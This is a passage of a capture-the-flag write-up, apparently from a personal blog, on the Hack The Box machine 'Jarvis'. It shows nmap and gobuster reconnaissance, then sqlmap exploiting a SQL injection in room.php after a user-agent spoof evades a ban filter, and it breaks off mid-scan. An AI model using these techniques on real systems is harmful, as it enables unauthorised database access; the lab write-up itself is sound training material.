<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">

    
      <link rel="icon" href="/favicon.png" />
    

    <title>
        
          Hack The Box - Jarvis - 0xRick
        
    </title>
    <style>
  #carbonads {
    border: 1px solid black;
    border-radius: 7px;
    border-spacing: 7px;
    display: block;
    overflow: hidden;
    padding: 1em;
    line-height: 1.5;
  }
  #carbonads span {
    position: relative;
    display: block;
    overflow: hidden;
  }
  .carbon-img {
    float: left;
    margin-right: 1em;
  }
  .carbon-img img {
    display: block;
  }
  .carbon-text {
    display: block;
    float: left;
    max-width: calc(100% - 130px - 1em);
    text-align: left;
  }
  .carbon-poweredby {
    position: absolute;
    left: 142px;
    bottom: 0;
    display: block;
    font-size: .8em;
    line-height: 1;
    letter-spacing: 1px;
    }
    </style>
    <!-- Spectre.css framework -->
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">

    <!-- theme css & js -->
    
<link rel="stylesheet" href="/css/book.css">

    
<script src="/js/book.js"></script>


    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">

    
<!-- Google Analytics -->
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-97164925-2', 'auto');
ga('send', 'pageview');
</script>
<!-- End Google Analytics -->

    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('.book-content img')
})
</script>

    <style>
      #htbbadge{
        float: left;
      }
    </style>
<meta name="generator" content="Hexo 4.2.0"></head>

<body>

<div class="book-container">
  <div class="book-sidebar">
    <div class="book-brand">
  <a href="/">
    <img src="/favicon.png">
    <span>0XRICK</span>
  </a>
</div>
    <div class="book-menu">
  <ul>
<li><a href="/">Home</a></li>
</ul>
<h1 id="Categories"><a href="#Categories" class="headerlink" title="Categories"></a>Categories</h1><h2 id="Hack-The-Box-Write-ups"><a href="#Hack-The-Box-Write-ups" class="headerlink" title="Hack The Box Write-ups"></a>Hack The Box Write-ups</h2><ul>
<li><a href="/hack-the-box/ai/">Hack The Box - AI</a></li>
<li><a href="/hack-the-box/player/">Hack The Box - Player</a></li>
<li><a href="/hack-the-box/bitlab/">Hack The Box - Bitlab</a></li>
<li><a href="/hack-the-box/craft/">Hack The Box - Craft</a></li>
<li><a href="/hack-the-box/smasher2/">Hack The Box - Smasher2</a></li>
<li><a href="/hack-the-box/wall/">Hack The Box - Wall</a></li>
<li><a href="/hack-the-box/heist/">Hack The Box - Heist</a></li>
<li><a href="/hack-the-box/chainsaw/">Hack The Box - Chainsaw</a></li>
<li><a href="/hack-the-box/networked/">Hack The Box - Networked</a></li>
<li><a href="/hack-the-box/jarvis/">Hack The Box - Jarvis</a></li>
<li><a href="/hack-the-box/haystack/">Hack The Box - Haystack</a></li>
<li><a href="/hack-the-box/safe/">Hack The Box - Safe</a></li>
<li><a href="/hack-the-box/ellingson/">Hack The Box - Ellingson</a></li>
<li><a href="/hack-the-box/writeup/">Hack The Box - Writeup</a></li>
<li><a href="/hack-the-box/ghoul">Hack The Box - Ghoul</a></li>
<li><a href="/hack-the-box/swagshop/">Hack The Box - Swagshop</a></li>
<li><a href="/hack-the-box/kryptos/">Hack The Box - Kryptos</a></li>
<li><a href="/hack-the-box/luke/">Hack The Box - Luke</a></li>
<li><a href="/hack-the-box/bastion/">Hack The Box - Bastion</a></li>
<li><a href="/hack-the-box/bastion-2/">Hack The Box - Bastion (Commando)</a></li>
<li><a href="/hack-the-box/onetwoseven/">Hack The Box - OneTwoSeven</a></li>
<li><a href="/hack-the-box/unattended/">Hack The Box - Unattended</a></li>
<li><a href="/hack-the-box/helpline/">Hack The Box - Helpline</a></li>
<li><a href="/hack-the-box/arkham/">Hack The Box - Arkham</a></li>
<li><a href="/hack-the-box/fortune">Hack The Box - Fortune</a></li>
<li><a href="/hack-the-box/lacasadepapel/">Hack The Box - LaCasaDePapel</a></li>
<li><a href="/hack-the-box/ctf/">Hack The Box - CTF</a></li>
<li><a href="/c/categories/#Hack-The-Box"><strong>Older</strong></a></li>
</ul>
<h2 id="Wizard-Labs-Write-ups"><a href="#Wizard-Labs-Write-ups" class="headerlink" title="Wizard Labs Write-ups"></a>Wizard Labs Write-ups</h2><ul>
<li><a href="/wizard-labs/devlife/">Wizard Labs - Devlife</a></li>
<li><a href="/wizard-labs/dummy/">wizard Labs - Dummy</a></li>
</ul>
<h2 id="Basic-Binary-Exploitation"><a href="#Basic-Binary-Exploitation" class="headerlink" title="Basic Binary Exploitation"></a>Basic Binary Exploitation</h2><ul>
<li><a href="/binary-exploitation/bof6/">Bof: re2libc - protostar stack6</a></li>
<li><a href="/binary-exploitation/bof5/">Bof: ShellCode Injection - protostar stack5</a></li>
<li><a href="/binary-exploitation/bof4/">Bof: Taking control of the instruction pointer - protostar stack4</a></li>
<li><a href="/binary-exploitation/bof3/">Bof: Overwriting function pointers - protostar stack3</a></li>
<li><a href="/binary-exploitation/bof2/">Bof: Overwriting stack variables - protostar stack1,2</a></li>
<li><a href="/binary-exploitation/bof1/">Buffer Overflow Explained</a></li>
</ul>
<h2 id="Pwn-Challenges-Write-ups"><a href="#Pwn-Challenges-Write-ups" class="headerlink" title="Pwn Challenges Write-ups"></a>Pwn Challenges Write-ups</h2><ul>
<li><a href="/pwn/collision/">pwnable.kr - collision</a></li>
<li><a href="/pwn/bof/">pwnable.kr - bof</a></li>
<li><a href="/pwn/fd/">pwnable.kr - fd</a></li>
</ul>
<h2 id="Misc-CTF-Write-ups"><a href="#Misc-CTF-Write-ups" class="headerlink" title="Misc CTF Write-ups"></a>Misc CTF Write-ups</h2><ul>
<li><a href="/ctfs/egctf-qual/">EGCTF 2019 - Qualification Round</a></li>
</ul>
<h2 id="Lists"><a href="#Lists" class="headerlink" title="Lists"></a>Lists</h2><ul>
<li><a href="/lists/stego/">Steganography</a></li>
</ul>

</div>


<script src="/js/book-menu.js"></script>

  </div>

  <div class="off-canvas-content">
    <div class="columns">
      <div class="column col-10 col-lg-12">
        <div class="book-navbar">
          <!-- For Responsive Layout -->

<header class="navbar">
  <section class="navbar-section">
    <a onclick="open_sidebar()">
      <i class="icon icon-menu"></i>
    </a>
  </section>
</header>

        </div>
        <div class="book-content">
          <div class="book-post">
  <div> <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script> </div> <br>
  <h1 id="Hack-The-Box-Jarvis"><a href="#Hack-The-Box-Jarvis" class="headerlink" title="Hack The Box - Jarvis"></a>Hack The Box - Jarvis</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Hey guys, today Jarvis retired and here’s my write-up about it. It was a nice easy box with a web application vulnerable to <code>SQL</code> injection, a python script vulnerable to command injection and a setuid binary that could be abused to get a root shell. It’s a medium box and its ip is <code>10.10.10.143</code>, I added it to <code>/etc/hosts</code> as <code>jarvis.htb</code>. Let’s jump right in!</p>
<p><img src="/images/hackthebox/jarvis/0.png" alt=""></p>
<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>As always we will start with <code>nmap</code> to scan for open ports and services:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;jarvis# nmap -sV -sT -sC -o nmapinitial jarvis.htb</span><br><span class="line">Starting Nmap 7.70 ( https:&#x2F;&#x2F;nmap.org ) at 2019-11-08 17:33 EET</span><br><span class="line">Nmap scan report for jarvis.htb (10.10.10.143)</span><br><span class="line">Host is up (0.24s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)</span><br><span class="line">|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)</span><br><span class="line">|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">| http-cookie-flags:</span><br><span class="line">|   &#x2F;:</span><br><span class="line">|     PHPSESSID:</span><br><span class="line">|_      httponly flag not set</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.25 (Debian)</span><br><span class="line">|_http-title: Stark Hotel</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 32.86 seconds</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;jarvis#</span><br></pre></td></tr></table></figure>
<p>We got <code>ssh</code> on port 22 and <code>http</code> on port 80. Let’s take a look at the web service.</p>
<h2 id="Web-Enumeration"><a href="#Web-Enumeration" class="headerlink" title="Web Enumeration"></a>Web Enumeration</h2><p>By visiting <code>http://jarvis.htb/</code> we get a website for a hotel called Stark Hotel:<br><img src="/images/hackthebox/jarvis/1.png" alt=""></p>
<p><img src="/images/hackthebox/jarvis/2.png" alt=""></p>
<p><img src="/images/hackthebox/jarvis/3.png" alt=""></p>
<p><img src="/images/hackthebox/jarvis/4.png" alt=""></p>
<p><img src="/images/hackthebox/jarvis/5.png" alt=""><br>I ran <code>gobuster</code> to check for any sub directories and the only interesting thing I found was <code>/phpmyadmin</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;jarvis# gobuster -u http:&#x2F;&#x2F;jarvis.htb&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Gobuster v2.0.1              OJ Reeves (@TheColonial)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">[+] Mode         : dir</span><br><span class="line">[+] Url&#x2F;Domain   : http:&#x2F;&#x2F;jarvis.htb&#x2F;</span><br><span class="line">[+] Threads      : 10</span><br><span class="line">[+] Wordlist     : &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt</span><br><span class="line">[+] Status codes : 200,204,301,302,307,403</span><br><span class="line">[+] Timeout      : 10s</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2019&#x2F;11&#x2F;08 17:38:59 Starting gobuster</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x2F;.hta (Status: 403)</span><br><span class="line">&#x2F;.htaccess (Status: 403)</span><br><span class="line">&#x2F;.htpasswd (Status: 403)</span><br><span class="line">&#x2F;css (Status: 301)</span><br><span class="line">&#x2F;fonts (Status: 301)</span><br><span class="line">&#x2F;images (Status: 301)</span><br><span class="line">&#x2F;index.php (Status: 200)</span><br><span class="line">&#x2F;js (Status: 301)</span><br><span class="line">&#x2F;phpmyadmin (Status: 301)</span><br><span class="line">&#x2F;server-status (Status: 403)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2019&#x2F;11&#x2F;08 17:40:39 Finished</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
<p><code>http://jarvis.htb/phpmyadmin</code><br><img src="/images/hackthebox/jarvis/6.png" alt=""></p>
<blockquote>
<p>phpMyAdmin is a free software tool written in <a href="https://php.net/" target="_blank" rel="noopener">PHP</a>, intended to handle the administration of <a href="https://www.mysql.com/" target="_blank" rel="noopener">MySQL</a> over the Web. phpMyAdmin supports a wide range of operations on MySQL and MariaDB. Frequently used operations (managing databases, tables, columns, relations, indexes, users, permissions, etc) can be performed via the user interface, while you still have the ability to directly execute any SQL statement. -<a href="https://phpmyadmin.net/" target="_blank" rel="noopener">phpmyadmin.net</a></p>
</blockquote>
<p>That can be useful later if we could find the credentials, but for now let’s concentrate on the web application.</p>
<h2 id="SQLi-in-room-php"><a href="#SQLi-in-room-php" class="headerlink" title="SQLi in room.php"></a>SQLi in room.php</h2><p>Back to the “Rooms &amp; Suites” section in the main page, clicking on any of these rooms requests <code>/room.php</code> with a parameter called <code>cod</code> that holds the room number:<br><img src="/images/hackthebox/jarvis/3.png" alt=""></p>
<p><img src="/images/hackthebox/jarvis/7.png" alt=""><br>I tried replacing the number with a single quote <code>&#39;</code> and I got a weird response:<br><img src="/images/hackthebox/jarvis/8.png" alt=""><br>So I ran <code>sqlmap</code> but I got a 404 response:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/HTB/boxes/jarvis<span class="comment"># sqlmap -u http://jarvis.htb/room.php?cod=1             </span></span><br><span class="line">        ___           </span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[(]_____ ___ ___  &#123;1.3.4#stable&#125;</span><br><span class="line">|_ -| . [)]     | .'| . |</span><br><span class="line">|___|_  [)]_|_|_|__,|  _|                 </span><br><span class="line">      |_|V...       |_|   http://sqlmap.org</span><br><span class="line">      </span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the <span class="keyword">end</span> <span class="keyword">user</span><span class="string">'s responsibility to obey all applicable local, state and federal laws. Developers assume no</span></span><br><span class="line"><span class="string"> liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 17:43:03 /2019-11-08/</span></span><br><span class="line"><span class="string">[17:43:03] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">[17:43:04] [INFO] checking if the target is protected by some kind of WAF/IPS</span></span><br><span class="line"><span class="string">[17:43:04] [INFO] testing if the target URL content is stable</span></span><br><span class="line"><span class="string">[17:43:05] [INFO] heuristics detected web page charset '</span><span class="keyword">ascii</span><span class="string">'</span></span><br><span class="line"><span class="string">[17:43:05] [WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk </span></span><br><span class="line"><span class="string">results, refer to user'</span>s <span class="keyword">manual</span> paragraph <span class="string">'Page comparison'</span></span><br><span class="line">how <span class="keyword">do</span> you want <span class="keyword">to</span> proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C</span><br><span class="line">[<span class="number">17</span>:<span class="number">43</span>:<span class="number">13</span>] [INFO] searching <span class="keyword">for</span> dynamic <span class="keyword">content</span></span><br><span class="line">[<span class="number">17</span>:<span class="number">43</span>:<span class="number">13</span>] [<span class="keyword">CRITICAL</span>] page <span class="keyword">not</span> <span class="keyword">found</span> (<span class="number">404</span>)</span><br><span class="line">[<span class="number">17</span>:<span class="number">43</span>:<span class="number">13</span>] [<span class="keyword">WARNING</span>] <span class="keyword">HTTP</span> <span class="keyword">error</span> codes detected during run:</span><br><span class="line"><span class="number">404</span> (<span class="keyword">Not</span> <span class="keyword">Found</span>) - <span class="number">2</span> times</span><br><span class="line">[*] ending @ <span class="number">17</span>:<span class="number">43</span>:<span class="number">13</span> /<span class="number">2019</span><span class="number">-11</span><span class="number">-08</span>/</span><br></pre></td></tr></table></figure>
<p>I checked the page again and saw a message indicating that I got banned for 90 seconds:<br><img src="/images/hackthebox/jarvis/9.png" alt=""><br>I assumed that it checks for the user-agent because the ban happened immediately, so I added the <code>--user-agent</code> option and used Firefox user-agent, that was enough to bypass the filter:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/HTB/boxes/jarvis<span class="comment"># sqlmap -u http://jarvis.htb/room.php?cod=1 --user-agent "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"     </span></span><br><span class="line">        ___           </span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[(]_____ ___ ___  &#123;1.3.4#stable&#125;</span><br><span class="line">|_ -| . [,]     | .'| . |</span><br><span class="line">|___|_  [.]_|_|_|__,|  _|</span><br><span class="line">      |_|V...       |_|   http://sqlmap.org                       </span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the <span class="keyword">end</span> <span class="keyword">user</span><span class="string">'s responsibility to obey all applicable local, state and federal laws. Developers assume no</span></span><br><span class="line"><span class="string"> liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">[*] starting @ 22:15:42 /2019-11-08/</span></span><br><span class="line"><span class="string">[22:15:42] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">[22:15:43] [INFO] checking if the target is protected by some kind of WAF/IPS</span></span><br><span class="line"><span class="string">[22:15:43] [INFO] testing if the target URL content is stable</span></span><br><span class="line"><span class="string">[22:15:44] [INFO] target URL content is stable</span></span><br><span class="line"><span class="string">[22:15:44] [INFO] testing if GET parameter '</span>cod<span class="string">' is dynamic</span></span><br><span class="line"><span class="string">[22:15:45] [INFO] GET parameter '</span>cod<span class="string">' appears to be dynamic</span></span><br><span class="line"><span class="string">[22:15:46] [INFO] heuristic (basic) test shows that GET parameter '</span>cod<span class="string">' might be injectable</span></span><br><span class="line"><span class="string">[22:15:46] [INFO] testing for SQL injection on GET parameter '</span>cod<span class="string">'</span></span><br><span class="line"><span class="string">[22:15:46] [INFO] testing '</span><span class="keyword">AND</span> <span class="built_in">boolean</span>-based blind - <span class="keyword">WHERE</span> <span class="keyword">or</span> <span class="keyword">HAVING</span> clause<span class="string">'</span></span><br><span class="line"><span class="string">[22:15:48] [INFO] GET parameter '</span>cod<span class="string">' appears to be '</span><span class="keyword">AND</span> <span class="built_in">boolean</span>-based blind - <span class="keyword">WHERE</span> <span class="keyword">or</span> <span class="keyword">HAVING</span> clause<span class="string">' injectable (with --string="of")</span></span><br><span class="line"><span class="string">[22:15:52] [INFO] heuristic (extended) test shows that the back-end DBMS could be '</span>MySQL<span class="string">'  </span></span><br><span class="line"><span class="string">it looks like the back-end DBMS is '</span>MySQL<span class="string">'. Do you want to skip test payloads specific for other DBMSes? [Y/n] n</span></span><br><span class="line"><span class="string">for the remaining tests, do you want to include all tests for '</span>MySQL<span class="string">' extending provided level (1) and risk (1) values? [Y/n] y    </span></span><br><span class="line"><span class="string">[22:15:56] [INFO] testing '</span>MySQL &gt;= <span class="number">5.5</span> <span class="keyword">AND</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span>, <span class="keyword">HAVING</span>, <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">or</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> clause (<span class="built_in">BIGINT</span> <span class="keyword">UNSIGNED</span>)<span class="string">'             </span></span><br><span class="line"><span class="string">[22:15:56] [INFO] testing '</span>MySQL &gt;= <span class="number">5.5</span> <span class="keyword">OR</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span> <span class="keyword">or</span> <span class="keyword">HAVING</span> clause (<span class="built_in">BIGINT</span> <span class="keyword">UNSIGNED</span>)<span class="string">'                 </span></span><br><span class="line"><span class="string">[22:15:57] [INFO] testing '</span>MySQL &gt;= <span class="number">5.5</span> <span class="keyword">AND</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span>, <span class="keyword">HAVING</span>, <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">or</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> clause (<span class="keyword">EXP</span>)<span class="string">'</span></span><br><span class="line"><span class="string">[22:15:57] [INFO] testing '</span>MySQL &gt;= <span class="number">5.5</span> <span class="keyword">OR</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span> <span class="keyword">or</span> <span class="keyword">HAVING</span> clause (<span class="keyword">EXP</span>)<span class="string">'  </span></span><br><span class="line"><span class="string">[22:15:57] [INFO] testing '</span>MySQL &gt;= <span class="number">5.7</span><span class="number">.8</span> <span class="keyword">AND</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span>, <span class="keyword">HAVING</span>, <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">or</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> clause (JSON_KEYS)<span class="string">'             </span></span><br><span class="line"><span class="string">[22:15:57] [INFO] testing '</span>MySQL &gt;= <span class="number">5.7</span><span class="number">.8</span> <span class="keyword">OR</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span> <span class="keyword">or</span> <span class="keyword">HAVING</span> clause (JSON_KEYS)<span class="string">'                     </span></span><br><span class="line"><span class="string">[22:15:58] [INFO] testing '</span>MySQL &gt;= <span class="number">5.0</span> <span class="keyword">AND</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span>, <span class="keyword">HAVING</span>, <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">or</span> <span class="keyword">GROUP</span> <span class="keyword">BY</span> clause (<span class="keyword">FLOOR</span>)<span class="string">'        </span></span><br><span class="line"><span class="string">[22:15:58] [INFO] testing '</span>MySQL &gt;= <span class="number">5.0</span> <span class="keyword">OR</span> <span class="keyword">error</span>-based - <span class="keyword">WHERE</span>, <span 